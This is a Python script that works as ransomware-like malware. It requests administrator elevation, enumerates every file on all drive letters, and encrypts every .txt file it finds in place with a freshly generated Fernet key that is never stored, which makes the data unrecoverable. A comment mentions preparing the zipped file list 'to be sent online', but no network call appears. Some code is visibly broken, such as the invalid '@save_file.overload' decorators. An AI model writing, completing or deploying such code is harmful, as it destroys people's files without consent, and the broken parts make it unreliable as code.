import ctypes
import os
import zipfile
import re
import string
import subprocess
import sys
from cryptography.fernet import Fernet
import tempfile
from typing import IO
import traceback


def read_file(file_path: str) -> bytes:
    file: bytes
    with open(file_path, 'rb') as data:
        file = data.read()
        data.close()
    return file


def create_temp_file_with_data(data: bytes) -> tempfile.NamedTemporaryFile:
    t = tempfile.NamedTemporaryFile(mode='w+b', delete=True)
    t.write(data)
    # t.seek(0)  # Reset the file pointer to the beginning
    return t


def save_file(path: str, file_data: bytes) -> bool:
    try:
        with open(path, 'wb') as file:
            file.write(file_data)
            file.close()
            return True
    except:
        return False


@save_file.overload(str, list[list[str]])
def save_file(path: str, file_data: list[list[str]]) -> None:
    """
    Save a multilayer array into a file
    :param path: Where the file should be save
    :param file_data: Data of the file
    :return: None
    """
    with open(path, 'w', encoding="utf-8") as save:
        for e in file_data:
            for k in e:
                save.write(f'{k}\n')
        save.close()


@save_file.overload(str,list[str])
def save_file(path: str, files: list[str]) -> None:
    """
    Save a monolayer array
    :param path: Path for the new file to create
    :param files: Data that will go in that file
    :return:
    """
    with open(path, 'w', encoding="utf-8") as save:
        for e in files:
            save.write(f'{e}\n')
    save.close()


def encrypt_temp_file(tempo: IO[bytes], f_key: Fernet) -> bytes:
    tempo.seek(0)  # Make sure we read the tempfile from the beginning
    data = tempo.read()  # Read data from the tempfile
    encrypted_data = f_key.encrypt(data)  # Encrypt the data with the Fernet key
    return encrypted_data


def encrypt_file(file_path: str, f_key: Fernet) -> bool:

    tempo: tempfile.NamedTemporaryFile
    try:
        file = read_file(file_path)
        tempo = create_temp_file_with_data(file)
        file = encrypt_temp_file(tempo, f_key)
        save_file(file_path, file)
        tempo.close()
        return True
    except:
        print(traceback.format_exc())
        return False


# ALL DIRECTORY RELATED FUNCTIONS
def find_directory_from_file(name_of_file: [str], is_compress: bool, path: str, name_of_zip: str) -> [str]:
    """
    will find all the information inside a folder where the data have been save. if it is compres it
    will be able to decompress it and find the file that was inside after ward.
    :param name_of_file: The name of the file we want to get all the data from
    :param is_compress: if the file have been compress (zip)
    :param path: the path where we should extract the compress file (keep empty if false)
    :param name_of_zip : The name that the zip file will have
    :return: a string array with all the path
    """
    files: [str] = []
    if is_compress:
        with zipfile.ZipFile(name_of_zip, 'r') as zip_ref:
            zip_ref.extractall(path)
    for i in name_of_file:
        try:
            with open(i, 'r') as data:
                for e in data:
                    files.append(e.replace('\n', ''))
        except PermissionError as error:
            print(error)
    return files


def find_all_files(start_path: str) -> [str]:
    """
    :param start_path: path to look all of the children
    :return : all the computer files
    """

    files_in_directory: [] = []
    for root, dirs, files in os.walk(start_path):
        for file in files:
            file_path = os.path.join(root, file)
            files_in_directory.append(file_path)
    return files_in_directory


def compress_files(path: [str], compress_file_name: str) -> None:
    """
    Will zip a file into a specified path
    :param path: path where the file to compress is
    :param compress_file_name:  the name of the zip. DO NOT PUT.ZIP
    :return: None
    """
    # create a file with all the path of the computer
    # Compress the file with all the path to prepare it to be sent online
    with zipfile.ZipFile(f'{compress_file_name}.zip', 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as \
            compress:
        for e in path:
            compress.write(e, arcname=e)
    compress.close()


def find_file_by_type(data_path: str, file_type: str) -> [str]:
    """
    Split files to get only the wanted one
    :param data_path: The path where the file with the data you want to look is
    :param file_type: the type of the file you want to find like .txt, .docx, .exe...
    :return: array of string with all the file absolute path
    """
    regex = f'^.*(?:{file_type})'  # will look at the extention and take everything before
    reg: [str] = []
    with open(data_path, 'r') as data:
        for e in data:
            if re.match(regex, e):
                reg.append(e.replace('\n', ''))
    data.close()
    return reg


def find_all_file_from_directory(data_path: str, name_of_directory: str) -> [str]:
    """
    Will find all the files that have a specific directory (even partly)
    :param data_path: path where the files his
    :param name_of_directory : name of the directory
    :return:
    """
    regex: str = f'(.*(?:{name_of_directory}).*)'
    reg: [str] = []
    with open(data_path, 'r') as data:
        for e in data:
            if re.match(regex, e):
                reg.append(e)
    data.close()
    return reg


# CMD/POWERSHELL related
def powershell(cmd) -> subprocess:
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed


def is_admin() -> bool:
    """
    :return: if the program is admin
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(e)
        return False


# RUN
def main():
    # Look if program is admin
    files: [] = []
    base = string.ascii_uppercase

    # give admin permission
    if is_admin():
        pass
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    # Name of the saving files
    compress_file_name = '.\\Compress.zip'
    files_name = ['.\\test.txt']
    for init_path in base:
        print(f'starting {init_path}')

        # Find all the computers files
        files.append(find_all_files(f'{init_path}:\\'))

        # Save Zone
        for e in files_name:
            save_file(e, files)
        compress_files(files_name, compress_file_name)

    # ENCRYPTION ZONE
    key = Fernet.generate_key()  # key generator
    cipher = Fernet(key)
    # get all the path from files
    with open('txt.txt', 'w') as file:
        for e in files_name:
            for i in find_file_by_type(e, '.txt'):
                file.write(f'{i}\n')
    all_path = find_directory_from_file(['.\\txt.txt'], False, '.\\', compress_file_name)
    for e in all_path:
        encrypt_file(e, cipher)
    print('Encryption over')

    input('its over')


if __name__ == "__main__":
    main()
